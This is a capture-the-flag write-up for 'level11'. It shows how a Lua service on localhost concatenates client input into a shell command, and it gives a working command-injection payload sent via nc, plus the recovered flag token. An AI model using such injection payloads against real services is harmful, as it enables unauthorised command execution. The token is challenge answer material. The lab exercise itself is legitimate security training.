# level11

1. Files found in `~/` :

```bash
level11.lua
```

2. Analysis of the `level11.lua` script

The service listens on `127.0.0.1:5151` and reads a line provided by the client.
It then executes :

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

Problem : the `pass` variable is **concatenated** directly into a shell command → **shell injection possible** (substitutions `$(...)`, backticks, `;`, redirections, etc.).

3. Exploitation

The process executes with the rights of `flag11` → the objective is to execute `/bin/getflag` on the server side and write the output to a file readable by the user.

```bash
# send the payload to the service (from the same machine, as the service binds 127.0.0.1)
echo '$(/bin/getflag > /tmp/flag11; chmod 644 /tmp/flag11)' | nc 127.0.0.1 5151

# retrieve the created token
cat /tmp/flag11
```

4. Token discovered

The token is : `fa6v5ateaw21peobuub8ipe6s`